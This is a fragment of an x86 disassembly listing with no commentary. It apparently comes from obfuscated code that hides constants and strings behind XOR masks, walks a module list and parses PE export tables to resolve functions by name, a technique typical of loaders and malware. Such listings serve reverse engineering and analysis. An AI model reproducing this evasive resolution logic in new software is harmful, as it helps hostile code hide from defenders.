  427e95:	mov    esi,DWORD PTR [ebp-0x14]
  427e98:	xor    eax,ecx
  427e9a:	add    eax,edx
  427e9c:	cmp    esi,eax
  427e9e:	je     0x42806b
  427ea4:	mov    eax,DWORD PTR [ebp-0xc]
  427ea7:	xor    eax,ecx
  427ea9:	add    eax,edx
  427eab:	mov    DWORD PTR [ebp-0x24],eax
  427eae:	mov    eax,DWORD PTR [ebp-0xc]
  427eb1:	xor    eax,ecx
  427eb3:	add    eax,edx
  427eb5:	mov    DWORD PTR [ebp-0x28],eax
  427eb8:	mov    edi,DWORD PTR [ebp-0x20]
  427ebb:	mov    ebx,DWORD PTR [ebp-0x8]
  427ebe:	mov    esi,0x8ae
  427ec3:	xor    edi,esi
  427ec5:	mov    eax,0x72f5
  427eca:	xor    ebx,esi
  427ecc:	add    edi,eax
  427ece:	add    ebx,eax
  427ed0:	sub    ebx,edi
  427ed2:	mov    WORD PTR [ebp-0x8],bx
  427ed6:	jmp    0x427f9b
  427edb:	mov    edi,DWORD PTR [ebp-0xc]
  427ede:	mov    bx,WORD PTR [ebp-0x4]
  427ee2:	xor    edi,esi
  427ee4:	add    edi,eax
  427ee6:	cmp    bx,di
  427ee9:	je     0x427fdd
  427eef:	mov    edi,DWORD PTR [ebp-0xc]
  427ef2:	mov    ebx,DWORD PTR [ebp+0xc]
  427ef5:	xor    edi,ecx
  427ef7:	add    edi,edx
  427ef9:	cmp    ebx,edi
  427efb:	mov    di,WORD PTR [ebp-0x4]
  427eff:	mov    bx,WORD PTR [ebp+0x8]
  427f03:	je     0x427f6e
  427f05:	cmp    bx,di
  427f08:	je     0x427f77
  427f0a:	mov    edi,DWORD PTR [ebp-0x20]
  427f0d:	mov    bx,WORD PTR [ebp+0x8]
  427f11:	xor    edi,esi
  427f13:	add    edi,eax
  427f15:	cmp    bx,di
  427f18:	jb     0x427f38
  427f1a:	mov    edi,DWORD PTR [ebp-0x2c]
  427f1d:	mov    bx,WORD PTR [ebp+0x8]
  427f21:	xor    edi,esi
  427f23:	add    edi,eax
  427f25:	cmp    bx,di
  427f28:	ja     0x427f38
  427f2a:	movzx  edi,WORD PTR [ebp+0x8]
  427f2e:	movzx  ebx,WORD PTR [ebp-0x8]
  427f32:	add    edi,ebx
  427f34:	mov    WORD PTR [ebp+0x8],di
  427f38:	mov    edi,DWORD PTR [ebp-0x20]
  427f3b:	mov    bx,WORD PTR [ebp-0x4]
  427f3f:	xor    edi,esi
  427f41:	add    edi,eax
  427f43:	cmp    bx,di
  427f46:	jb     0x427f66
  427f48:	mov    edi,DWORD PTR [ebp-0x2c]
  427f4b:	mov    bx,WORD PTR [ebp-0x4]
  427f4f:	xor    edi,esi
  427f51:	add    edi,eax
  427f53:	cmp    bx,di
  427f56:	ja     0x427f66
  427f58:	movzx  edi,WORD PTR [ebp-0x4]
  427f5c:	movzx  ebx,WORD PTR [ebp-0x8]
  427f60:	add    edi,ebx
  427f62:	mov    WORD PTR [ebp-0x4],di
  427f66:	mov    di,WORD PTR [ebp-0x4]
  427f6a:	mov    bx,WORD PTR [ebp+0x8]
  427f6e:	cmp    bx,di
  427f71:	jne    0x42806b
  427f77:	mov    edi,DWORD PTR [ebp-0x1c]
  427f7a:	mov    ebx,DWORD PTR [ebp-0x10]
  427f7d:	xor    edi,ecx
  427f7f:	lea    edi,[edi+ebx*1+0x3272f5]
  427f86:	mov    DWORD PTR [ebp-0x10],edi
  427f89:	mov    edi,DWORD PTR [ebp-0x1c]
  427f8c:	mov    ebx,DWORD PTR [ebp-0x14]
  427f8f:	xor    edi,ecx
  427f91:	lea    edi,[edi+ebx*1+0x3272f5]
  427f98:	mov    DWORD PTR [ebp-0x14],edi
  427f9b:	mov    edi,DWORD PTR [ebp-0x24]
  427f9e:	mov    ebx,DWORD PTR [ebp-0x10]
  427fa1:	mov    di,WORD PTR [ebx+edi*2]
  427fa5:	mov    WORD PTR [ebp+0x8],di
  427fa9:	mov    edi,DWORD PTR [ebp-0x28]
  427fac:	mov    ebx,DWORD PTR [ebp-0x14]
  427faf:	mov    di,WORD PTR [ebx+edi*2]
  427fb3:	mov    WORD PTR [ebp-0x4],di
  427fb7:	mov    edi,DWORD PTR [ebp-0xc]
  427fba:	mov    bx,WORD PTR [ebp+0x8]
  427fbe:	xor    edi,esi
  427fc0:	add    edi,eax
  427fc2:	cmp    bx,di
  427fc5:	jne    0x427edb
  427fcb:	mov    eax,DWORD PTR [ebp-0x18]
  427fce:	mov    esi,DWORD PTR [ebp-0xc]
  427fd1:	xor    eax,ecx
  427fd3:	add    eax,edx
  427fd5:	imul   eax,esi
  427fd8:	mov    DWORD PTR [ebp-0xc],eax
  427fdb:	jmp    0x427fef
  427fdd:	mov    eax,DWORD PTR [ebp-0xc]
  427fe0:	mov    esi,DWORD PTR [ebp-0x18]
  427fe3:	xor    eax,ecx
  427fe5:	lea    eax,[eax+esi*1+0x3272f5]
  427fec:	mov    DWORD PTR [ebp-0x18],eax
  427fef:	mov    eax,DWORD PTR [ebp-0x24]
  427ff2:	sub    eax,edx
  427ff4:	xor    eax,ecx
  427ff6:	mov    DWORD PTR [ebp-0x30],eax
  427ff9:	mov    eax,DWORD PTR [ebp-0x28]
  427ffc:	sub    eax,edx
  427ffe:	xor    eax,ecx
  428000:	mov    DWORD PTR [ebp-0x34],eax
  428003:	mov    eax,DWORD PTR [ebp-0x34]
  428006:	mov    esi,DWORD PTR [ebp-0x1c]
  428009:	xor    esi,ecx
  42800b:	add    esi,edx
  42800d:	xor    eax,ecx
  42800f:	add    eax,0x3272f5
  428014:	imul   esi,eax
  428017:	mov    eax,DWORD PTR [ebp-0x14]
  42801a:	movzx  eax,WORD PTR [esi+eax*1]
  42801e:	mov    esi,DWORD PTR [ebp-0x30]
  428021:	mov    edi,DWORD PTR [ebp-0x1c]
  428024:	xor    esi,ecx
  428026:	add    esi,edx
  428028:	xor    edi,ecx
  42802a:	add    edi,edx
  42802c:	imul   edi,esi
  42802f:	mov    esi,DWORD PTR [ebp-0x10]
  428032:	movzx  esi,WORD PTR [edi+esi*1]
  428036:	sub    eax,edx
  428038:	sub    esi,edx
  42803a:	xor    eax,ecx
  42803c:	xor    esi,ecx
  42803e:	cmp    esi,eax
  428040:	jne    0x42806b
  428042:	mov    eax,DWORD PTR [ebp-0x30]
  428045:	mov    esi,DWORD PTR [ebp-0x1c]
  428048:	xor    eax,ecx
  42804a:	add    eax,0x3272f5
  42804f:	xor    esi,ecx
  428051:	add    esi,edx
  428053:	imul   esi,eax
  428056:	mov    eax,DWORD PTR [ebp-0x10]
  428059:	movzx  eax,WORD PTR [esi+eax*1]
  42805d:	mov    esi,DWORD PTR [ebp-0xc]
  428060:	sub    eax,edx
  428062:	xor    eax,ecx
  428064:	cmp    eax,esi
  428066:	mov    eax,DWORD PTR [ebp-0xc]
  428069:	je     0x42806e
  42806b:	mov    eax,DWORD PTR [ebp-0x18]
  42806e:	pop    edi
  42806f:	xor    eax,ecx
  428071:	pop    esi
  428072:	add    eax,edx
  428074:	pop    ebx
  428075:	leave  
  428076:	ret    0x8
  428079:	push   ebp
  42807a:	mov    ebp,esp
  42807c:	push   ecx
  42807d:	mov    cx,WORD PTR [eax]
  428080:	push   esi
  428081:	mov    esi,0x3b5c
  428086:	sub    cx,si
  428089:	mov    esi,0x8a9a
  42808e:	xor    cx,si
  428091:	mov    esi,0x4e3e
  428096:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  42809d:	mov    edx,0xf89c85a5
  4280a2:	cmp    cx,si
  4280a5:	je     0x428104
  4280a7:	push   ebx
  4280a8:	push   edi
  4280a9:	movzx  ecx,cx
  4280ac:	mov    edi,0xffcd8d0b
  4280b1:	mov    esi,0x75108ae
  4280b6:	mov    ebx,0x4f9a
  4280bb:	cmp    cx,bx
  4280be:	jne    0x4280c3
  4280c0:	mov    DWORD PTR [ebp-0x4],edx
  4280c3:	lea    edx,[edi+0x1]
  4280c6:	xor    edx,esi
  4280c8:	mov    edi,edx
  4280ca:	xor    edi,esi
  4280cc:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  4280d4:	mov    ebx,0x3b5c
  4280d9:	sub    cx,bx
  4280dc:	mov    ebx,0x8a9a
  4280e1:	xor    cx,bx
  4280e4:	mov    ebx,0x4e3e
  4280e9:	cmp    cx,bx
  4280ec:	jne    0x4280b6
  4280ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4280f1:	pop    edi
  4280f2:	pop    ebx
  4280f3:	cmp    ecx,0xf89c85a4
  4280f9:	je     0x428104
  4280fb:	xor    ecx,esi
  4280fd:	lea    eax,[eax+ecx*2+0x64e5ec]
  428104:	pop    esi
  428105:	leave  
  428106:	ret    
  428107:	push   ebp
  428108:	mov    ebp,esp
  42810a:	push   ecx
  42810b:	push   esi
  42810c:	push   edi
  42810d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428114:	mov    esi,0xf89c85a5
  428119:	call   0x428079
  42811e:	mov    edi,eax
  428120:	mov    al,BYTE PTR [edi]
  428122:	sub    al,0x3
  428124:	xor    al,0x7e
  428126:	cmp    al,0x83
  428128:	je     0x42818b
  42812a:	mov    eax,edi
  42812c:	mov    edx,0xffcd8d0b
  428131:	mov    ecx,0x75108ae
  428136:	push   ebx
  428137:	mov    ax,WORD PTR [eax]
  42813a:	mov    ebx,0x3b5c
  42813f:	sub    ax,bx
  428142:	mov    ebx,0x8a9a
  428147:	xor    ax,bx
  42814a:	mov    ebx,0x4e48
  42814f:	cmp    ax,bx
  428152:	jne    0x428157
  428154:	mov    DWORD PTR [ebp-0x4],esi
  428157:	lea    esi,[edx+0x1]
  42815a:	xor    esi,ecx
  42815c:	mov    edx,esi
  42815e:	xor    edx,ecx
  428160:	lea    eax,[edi+edx*2+0x64e5ea]
  428167:	mov    bl,BYTE PTR [eax]
  428169:	sub    bl,0x3
  42816c:	xor    bl,0x7e
  42816f:	cmp    bl,0x83
  428172:	jne    0x428137
  428174:	mov    eax,DWORD PTR [ebp-0x4]
  428177:	pop    ebx
  428178:	cmp    eax,0xf89c85a4
  42817d:	je     0x42818b
  42817f:	xor    eax,ecx
  428181:	xor    ecx,ecx
  428183:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  42818b:	mov    eax,edi
  42818d:	pop    edi
  42818e:	pop    esi
  42818f:	leave  
  428190:	ret    
  428191:	push   ebp
  428192:	mov    ebp,esp
  428194:	push   ecx
  428195:	push   esi
  428196:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  42819d:	mov    esi,0xf89c85a5
  4281a2:	call   0x428079
  4281a7:	mov    cx,WORD PTR [eax]
  4281aa:	mov    edx,0x3b5c
  4281af:	sub    cx,dx
  4281b2:	mov    edx,0x8a9a
  4281b7:	xor    cx,dx
  4281ba:	mov    edx,0x4e3e
  4281bf:	cmp    cx,dx
  4281c2:	je     0x42821b
  4281c4:	push   ebx
  4281c5:	push   edi
  4281c6:	movzx  ecx,cx
  4281c9:	mov    edx,0xffcd8d0b
  4281ce:	mov    edi,0x75108ae
  4281d3:	mov    ebx,0x4e48
  4281d8:	cmp    cx,bx
  4281db:	jne    0x4281e0
  4281dd:	mov    DWORD PTR [ebp-0x4],esi
  4281e0:	lea    esi,[edx+0x1]
  4281e3:	xor    esi,edi
  4281e5:	mov    edx,esi
  4281e7:	xor    edx,edi
  4281e9:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  4281f1:	mov    ebx,0x3b5c
  4281f6:	sub    cx,bx
  4281f9:	mov    ebx,0x8a9a
  4281fe:	xor    cx,bx
  428201:	mov    ebx,0x4e3e
  428206:	cmp    cx,bx
  428209:	jne    0x4281d3
  42820b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428212:	pop    edi
  428213:	pop    ebx
  428214:	je     0x42821b
  428216:	xor    eax,eax
  428218:	inc    eax
  428219:	jmp    0x42821d
  42821b:	xor    eax,eax
  42821d:	pop    esi
  42821e:	leave  
  42821f:	ret    
  428220:	push   ebp
  428221:	mov    ebp,esp
  428223:	push   ecx
  428224:	mov    eax,DWORD PTR [ebp+0x8]
  428227:	movzx  ecx,WORD PTR [eax]
  42822a:	push   esi
  42822b:	lea    eax,[ecx-0x3b5c]
  428231:	mov    esi,0x8a9a
  428236:	push   edi
  428237:	xor    eax,esi
  428239:	mov    edi,0x4e3e
  42823e:	mov    DWORD PTR [ebp-0x4],edx
  428241:	cmp    ax,di
  428244:	je     0x428271
  428246:	mov    eax,DWORD PTR [ebp+0x8]
  428249:	sub    eax,edx
  42824b:	mov    DWORD PTR [ebp+0x8],eax
  42824e:	jmp    0x428253
  428250:	mov    eax,DWORD PTR [ebp+0x8]
  428253:	mov    WORD PTR [edx],cx
  428256:	add    edx,0x2
  428259:	movzx  edi,WORD PTR [eax+edx*1]
  42825d:	mov    ecx,edi
  42825f:	add    edi,0xffffc4a4
  428265:	xor    edi,esi
  428267:	mov    eax,0x4e3e
  42826c:	cmp    di,ax
  42826f:	jne    0x428250
  428271:	xor    eax,eax
  428273:	pop    edi
  428274:	mov    WORD PTR [edx],ax
  428277:	mov    eax,DWORD PTR [ebp-0x4]
  42827a:	pop    esi
  42827b:	leave  
  42827c:	ret    0x4
  42827f:	push   ebp
  428280:	mov    ebp,esp
  428282:	sub    esp,0x18
  428285:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  42828c:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  428293:	mov    ecx,DWORD PTR [ebp-0x8]
  428296:	push   esi
  428297:	mov    eax,0x75108ae
  42829c:	xor    ecx,eax
  42829e:	mov    esi,0x3272f5
  4282a3:	add    ecx,esi
  4282a5:	mov    DWORD PTR [ebp-0x4],ecx
  4282a8:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4282af:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4282b6:	push   edi
  4282b7:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  4282be:	jmp    0x42835f
  4282c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4282c6:	mov    edx,DWORD PTR [ebp+0x10]
  4282c9:	sub    edx,ecx
  4282cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4282ce:	xor    ecx,eax
  4282d0:	add    ecx,esi
  4282d2:	cmp    edx,ecx
  4282d4:	jbe    0x4282f1
  4282d6:	mov    edx,DWORD PTR [ebp-0x4]
  4282d9:	add    edx,DWORD PTR [ebp+0x8]
  4282dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4282df:	add    ecx,DWORD PTR [ebp+0xc]
  4282e2:	mov    edi,DWORD PTR [ecx]
  4282e4:	mov    DWORD PTR [edx],edi
  4282e6:	mov    ecx,DWORD PTR [ecx+0x4]
  4282e9:	mov    DWORD PTR [edx+0x4],ecx
  4282ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4282ef:	jmp    0x42833e
  4282f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4282f4:	mov    edx,DWORD PTR [ebp+0x10]
  4282f7:	sub    edx,ecx
  4282f9:	mov    ecx,DWORD PTR [ebp-0x10]
  4282fc:	xor    ecx,eax
  4282fe:	add    ecx,esi
  428300:	cmp    edx,ecx
  428302:	mov    ecx,DWORD PTR [ebp-0x4]
  428305:	jbe    0x428319
  428307:	add    ecx,DWORD PTR [ebp+0x8]
  42830a:	mov    edx,DWORD PTR [ebp-0x4]
  42830d:	add    edx,DWORD PTR [ebp+0xc]
  428310:	mov    edx,DWORD PTR [edx]
  428312:	mov    DWORD PTR [ecx],edx
  428314:	mov    ecx,DWORD PTR [ebp-0x10]
  428317:	jmp    0x42833e
  428319:	mov    edx,DWORD PTR [ebp+0x10]
  42831c:	sub    edx,ecx
  42831e:	mov    ecx,DWORD PTR [ebp-0x14]
  428321:	xor    ecx,eax
  428323:	add    ecx,esi
  428325:	cmp    edx,ecx
  428327:	mov    ecx,DWORD PTR [ebp-0x4]
  42832a:	jbe    0x42834f
  42832c:	add    ecx,DWORD PTR [ebp+0x8]
  42832f:	mov    edx,DWORD PTR [ebp-0x4]
  428332:	add    edx,DWORD PTR [ebp+0xc]
  428335:	mov    dx,WORD PTR [edx]
  428338:	mov    WORD PTR [ecx],dx
  42833b:	mov    ecx,DWORD PTR [ebp-0x14]
  42833e:	mov    edx,DWORD PTR [ebp-0x4]
  428341:	xor    ecx,eax
  428343:	lea    ecx,[ecx+edx*1+0x3272f5]
  42834a:	mov    DWORD PTR [ebp-0x4],ecx
  42834d:	jmp    0x42835f
  42834f:	add    ecx,DWORD PTR [ebp+0x8]
  428352:	mov    edx,DWORD PTR [ebp-0x4]
  428355:	add    edx,DWORD PTR [ebp+0xc]
  428358:	mov    dl,BYTE PTR [edx]
  42835a:	mov    BYTE PTR [ecx],dl
  42835c:	inc    DWORD PTR [ebp-0x4]
  42835f:	mov    ecx,DWORD PTR [ebp-0x18]
  428362:	mov    edx,DWORD PTR [ebp+0x10]
  428365:	xor    ecx,eax
  428367:	add    ecx,esi
  428369:	imul   ecx,edx
  42836c:	mov    edx,DWORD PTR [ebp-0x8]
  42836f:	mov    edi,DWORD PTR [ebp-0x4]
  428372:	xor    edx,eax
  428374:	lea    edx,[edx+edi*1+0x3272f5]
  42837b:	cmp    edx,ecx
  42837d:	jb     0x4282c3
  428383:	pop    edi
  428384:	pop    esi
  428385:	leave  
  428386:	ret    0xc
  428389:	push   ebp
  42838a:	mov    ebp,esp
  42838c:	sub    esp,0xc
  42838f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  428396:	push   esi
  428397:	mov    esi,eax
  428399:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4283a0:	mov    edx,DWORD PTR [ebp-0x4]
  4283a3:	mov    eax,0x75108ae
  4283a8:	xor    edx,eax
  4283aa:	mov    ecx,0x3272f5
  4283af:	add    edx,ecx
  4283b1:	cmp    esi,edx
  4283b3:	je     0x4283f5
  4283b5:	push   ebx
  4283b6:	push   edi
  4283b7:	mov    edx,DWORD PTR [ebp-0x8]
  4283ba:	mov    ebx,DWORD PTR [ebp+0x8]
  4283bd:	xor    edx,eax
  4283bf:	mov    edi,0xffcd8d0b
  4283c4:	sub    edi,edx
  4283c6:	add    esi,edi
  4283c8:	lea    edx,[esi-0x3272f5]
  4283ce:	xor    edx,eax
  4283d0:	mov    DWORD PTR [ebp-0xc],edx
  4283d3:	mov    edx,DWORD PTR [ebp-0x4]
  4283d6:	mov    edi,DWORD PTR [ebp-0xc]
  4283d9:	xor    dl,0xae
  4283dc:	sub    dl,0xb
  4283df:	xor    edi,eax
  4283e1:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  4283e8:	mov    edx,DWORD PTR [ebp-0x4]
  4283eb:	xor    edx,eax
  4283ed:	add    edx,ecx
  4283ef:	cmp    esi,edx
  4283f1:	jne    0x4283b7
  4283f3:	pop    edi
  4283f4:	pop    ebx
  4283f5:	pop    esi
  4283f6:	leave  
  4283f7:	ret    0x4
  4283fa:	push   ebp
  4283fb:	mov    ebp,esp
  4283fd:	sub    esp,0x21c
  428403:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42840a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428411:	mov    eax,DWORD PTR [ebp+0x10]
  428414:	mov    eax,DWORD PTR [ebp-0x4]
  428417:	mov    ecx,DWORD PTR [ebp+0x8]
  42841a:	push   esi
  42841b:	push   edi
  42841c:	mov    edi,0x75108ae
  428421:	xor    eax,edi
  428423:	mov    esi,0x3272f5
  428428:	add    eax,esi
  42842a:	cmp    eax,ecx
  42842c:	mov    eax,DWORD PTR [ebp-0x4]
  42842f:	jne    0x42843a
  428431:	xor    eax,edi
  428433:	add    eax,esi
  428435:	jmp    0x4284e6
  42843a:	mov    ecx,DWORD PTR [ebp+0xc]
  42843d:	xor    eax,edi
  42843f:	add    eax,esi
  428441:	cmp    eax,ecx
  428443:	jne    0x42844a
  428445:	mov    eax,DWORD PTR [ebp-0x4]
  428448:	jmp    0x428431
  42844a:	lea    eax,[ebp-0x21c]
  428450:	mov    DWORD PTR [ebp-0x8],eax
  428453:	mov    eax,DWORD PTR [ebp+0xc]
  428456:	mov    DWORD PTR [ebp-0x10],eax
  428459:	mov    eax,DWORD PTR [ebp-0x4]
  42845c:	xor    eax,edi
  42845e:	add    eax,esi
  428460:	mov    DWORD PTR [ebp+0x10],eax
  428463:	mov    eax,DWORD PTR [ebp+0xc]
  428466:	push   ebx
  428467:	call   0x428191
  42846c:	mov    ebx,eax
  42846e:	mov    eax,DWORD PTR [ebp+0x8]
  428471:	mov    eax,DWORD PTR [eax+0x14]
  428474:	jmp    0x4284ce
  428476:	mov    eax,DWORD PTR [ebp+0xc]
  428479:	sub    eax,0x8
  42847c:	mov    DWORD PTR [ebp-0xc],eax
  42847f:	mov    eax,DWORD PTR [ebp-0xc]
  428482:	mov    eax,DWORD PTR [eax+0x28]
  428485:	call   0x428079
  42848a:	mov    DWORD PTR [ebp+0x10],eax
  42848d:	push   DWORD PTR [ebp+0x10]
  428490:	mov    edx,DWORD PTR [ebp-0x8]
  428493:	call   0x428220
  428498:	mov    eax,DWORD PTR [ebp-0x4]
  42849b:	xor    eax,edi
  42849d:	add    eax,esi
  42849f:	cmp    eax,ebx
  4284a1:	jne    0x4284ab
  4284a3:	mov    eax,DWORD PTR [ebp-0x8]
  4284a6:	call   0x428107
  4284ab:	mov    eax,DWORD PTR [ebp-0x14]
  4284ae:	xor    eax,edi
  4284b0:	add    eax,esi
  4284b2:	push   eax
  4284b3:	push   DWORD PTR [ebp-0x10]
  4284b6:	mov    eax,DWORD PTR [ebp-0x8]
  4284b9:	call   0x427e33
  4284be:	mov    ecx,DWORD PTR [ebp-0x4]
  4284c1:	xor    ecx,edi
  4284c3:	add    ecx,esi
  4284c5:	cmp    eax,ecx
  4284c7:	je     0x4284ec
  4284c9:	mov    eax,DWORD PTR [ebp+0xc]
  4284cc:	mov    eax,DWORD PTR [eax]
  4284ce:	mov    DWORD PTR [ebp+0xc],eax
  4284d1:	mov    eax,DWORD PTR [ebp+0x8]
  4284d4:	mov    ecx,DWORD PTR [ebp+0xc]
  4284d7:	add    eax,0x14
  4284da:	cmp    ecx,eax
  4284dc:	jne    0x428476
  4284de:	mov    eax,DWORD PTR [ebp-0x4]
  4284e1:	xor    eax,edi
  4284e3:	add    eax,esi
  4284e5:	pop    ebx
  4284e6:	pop    edi
  4284e7:	pop    esi
  4284e8:	leave  
  4284e9:	ret    0xc
  4284ec:	mov    eax,DWORD PTR [ebp-0xc]
  4284ef:	mov    eax,DWORD PTR [eax+0x18]
  4284f2:	jmp    0x4284e5
  4284f4:	push   ebp
  4284f5:	mov    ebp,esp
  4284f7:	mov    eax,DWORD PTR [ebp+0xc]
  4284fa:	sub    esp,0x10
  4284fd:	cmp    DWORD PTR [ebp+0x8],0x0
  428501:	push   ebx
  428502:	push   esi
  428503:	push   edi
  428504:	je     0x4285b9
  42850a:	test   eax,eax
  42850c:	je     0x4285b9
  428512:	movzx  eax,WORD PTR [eax+0x20]
  428516:	mov    ecx,eax
  428518:	mov    DWORD PTR [ebp-0x10],eax
  42851b:	xor    edx,edx
  42851d:	and    DWORD PTR [ebp-0x8],edx
  428520:	mov    eax,0x8a9a
  428525:	xor    ecx,eax
  428527:	add    ecx,0x3b5c
  42852d:	mov    DWORD PTR [ebp-0xc],ecx
  428530:	and    DWORD PTR [ebp-0x4],0x0
  428534:	xor    ecx,ecx
  428536:	push   0xffffff81
  428538:	pop    edi
  428539:	cmp    cx,WORD PTR [ebp-0xc]
  42853d:	jae    0x4285a3
  42853f:	lea    esi,[edx-0x3b5c]
  428545:	xor    esi,eax
  428547:	movzx  ecx,WORD PTR [ebp-0x4]
  42854b:	mov    ebx,DWORD PTR [ebp+0xc]
  42854e:	lea    ecx,[ebx+ecx*4]
  428551:	cmp    WORD PTR [ecx+0x2],si
  428555:	jne    0x42858e
  428557:	movzx  ecx,WORD PTR [ecx]
  42855a:	mov    edi,0x4e3e
  42855f:	cmp    cx,di
  428562:	jne    0x428570
  428564:	mov    ebx,DWORD PTR [ebp+0x8]
  428567:	movzx  edi,dx
  42856a:	cmp    BYTE PTR [edi+ebx*1],0x0
  42856e:	je     0x42859d
  428570:	mov    ebx,DWORD PTR [ebp+0x8]
  428573:	movzx  edi,dx
  428576:	movsx  di,BYTE PTR [edi+ebx*1]
  42857b:	mov    ebx,0x3b5c
  428580:	sub    di,bx
  428583:	xor    di,ax
  428586:	cmp    cx,di
  428589:	je     0x42859d
  42858b:	push   0xffffff83
  42858d:	pop    edi
  42858e:	inc    DWORD PTR [ebp-0x4]
  428591:	mov    cx,WORD PTR [ebp-0xc]
  428595:	cmp    WORD PTR [ebp-0x4],cx
  428599:	jb     0x428547
  42859b:	jmp    0x4285a3
  42859d:	inc    DWORD PTR [ebp-0x8]
  4285a0:	push   0xffffff80
  4285a2:	pop    edi
  4285a3:	mov    esi,DWORD PTR [ebp+0x8]
  4285a6:	movzx  ecx,dx
  4285a9:	cmp    BYTE PTR [ecx+esi*1],0x0
  4285ad:	je     0x4285c2
  4285af:	inc    edx
  4285b0:	cmp    edi,0xffffff83
  4285b3:	jne    0x428530
  4285b9:	xor    eax,eax
  4285bb:	pop    edi
  4285bc:	pop    esi
  4285bd:	pop    ebx
  4285be:	leave  
  4285bf:	ret    0x8
  4285c2:	mov    ecx,DWORD PTR [ebp-0x8]
  4285c5:	add    ecx,0xffffc4a4
  4285cb:	xor    cx,ax
  4285ce:	xor    eax,eax
  4285d0:	cmp    cx,WORD PTR [ebp-0x10]
  4285d4:	sete   al
  4285d7:	jmp    0x4285bb
  4285d9:	push   ebp
  4285da:	mov    ebp,esp
  4285dc:	sub    esp,0x50
  4285df:	push   edi
  4285e0:	mov    edi,eax
  4285e2:	mov    eax,DWORD PTR [edi+0x1a8]
  4285e8:	cmp    DWORD PTR [eax],0x0
  4285eb:	jne    0x4285f4
  4285ed:	xor    eax,eax
  4285ef:	jmp    0x428725
  4285f4:	push   DWORD PTR [ebp+0x8]
  4285f7:	push   0x2c
  4285f9:	pop    eax
  4285fa:	call   0x428389
  4285ff:	mov    edx,DWORD PTR [edi+0x1ac]
  428605:	lea    eax,[edi+0x22]
  428608:	mov    DWORD PTR [ebp-0x4c],eax
  42860b:	lea    eax,[edi+0x44]
  42860e:	mov    DWORD PTR [ebp-0x48],eax
  428611:	lea    eax,[edi+0x66]
  428614:	mov    DWORD PTR [ebp-0x44],eax
  428617:	lea    eax,[edi+0x88]
  42861d:	mov    DWORD PTR [ebp-0x40],eax
  428620:	lea    eax,[edi+0xaa]
  428626:	mov    DWORD PTR [ebp-0x3c],eax
  428629:	lea    eax,[edi+0xcc]
  42862f:	mov    DWORD PTR [ebp-0x38],eax
  428632:	lea    eax,[edi+0xee]
  428638:	mov    DWORD PTR [ebp-0x34],eax
  42863b:	lea    eax,[edi+0x110]
  428641:	mov    DWORD PTR [ebp-0x30],eax
  428644:	lea    eax,[edi+0x132]
  42864a:	mov    DWORD PTR [ebp-0x2c],eax
  42864d:	lea    eax,[edi+0x154]
  428653:	push   edi
  428654:	mov    DWORD PTR [ebp-0x50],edi
  428657:	mov    DWORD PTR [ebp-0x28],eax
  42865a:	call   0x428759
  42865f:	push   eax
  428660:	mov    eax,DWORD PTR [edi+0x1a8]
  428666:	push   DWORD PTR [eax]
  428668:	call   0x4283fa
  42866d:	mov    DWORD PTR [ebp-0x10],eax
  428670:	test   eax,eax
  428672:	je     0x428725
  428678:	mov    ecx,DWORD PTR [eax+0x3c]
  42867b:	push   ebx
  42867c:	push   esi
  42867d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428681:	add    esi,eax
  428683:	mov    edi,DWORD PTR [esi+0x24]
  428686:	mov    ecx,DWORD PTR [esi+0x1c]
  428689:	mov    edx,DWORD PTR [esi+0x20]
  42868c:	mov    ebx,DWORD PTR [esi+0x18]
  42868f:	add    edi,eax
  428691:	mov    DWORD PTR [ebp-0x20],edi
  428694:	mov    edi,DWORD PTR [esi+0x14]
  428697:	add    ecx,eax
  428699:	add    edx,eax
  42869b:	mov    DWORD PTR [ebp-0xc],ecx
  42869e:	mov    DWORD PTR [ebp-0x1c],edx
  4286a1:	mov    DWORD PTR [ebp-0x8],edi
  4286a4:	cmp    edi,ebx
  4286a6:	ja     0x4286ab
  4286a8:	mov    DWORD PTR [ebp-0x8],ebx
  4286ab:	xor    ebx,ebx
  4286ad:	mov    DWORD PTR [ebp-0x18],ebx
  4286b0:	cmp    DWORD PTR [ebp-0x8],ebx
  4286b3:	jbe    0x428723
  4286b5:	jmp    0x4286ba
  4286b7:	mov    edx,DWORD PTR [ebp-0x1c]
  4286ba:	mov    edi,DWORD PTR [ebp-0x20]
  4286bd:	movzx  edi,WORD PTR [edi+ebx*2]
  4286c1:	cmp    ebx,DWORD PTR [esi+0x18]
  4286c4:	jae    0x428723
  4286c6:	cmp    edi,DWORD PTR [esi+0x14]
  4286c9:	jae    0x428723
  4286cb:	mov    ebx,DWORD PTR [edx+ebx*4]
  4286ce:	mov    edx,DWORD PTR [ebp+0x8]
  4286d1:	mov    edi,DWORD PTR [ecx+edi*4]
  4286d4:	mov    DWORD PTR [ebp-0x4],edx
  4286d7:	lea    edx,[ebp-0x50]
  4286da:	add    ebx,eax
  4286dc:	add    edi,eax
  4286de:	sub    edx,DWORD PTR [ebp+0x8]
  4286e1:	mov    DWORD PTR [ebp-0x14],0xb
  4286e8:	mov    DWORD PTR [ebp-0x24],edx
  4286eb:	mov    edx,DWORD PTR [ebp-0x4]
  4286ee:	cmp    DWORD PTR [edx],0x0
  4286f1:	jne    0x42870e
  4286f3:	mov    eax,DWORD PTR [ebp-0x24]
  4286f6:	push   DWORD PTR [eax+edx*1]
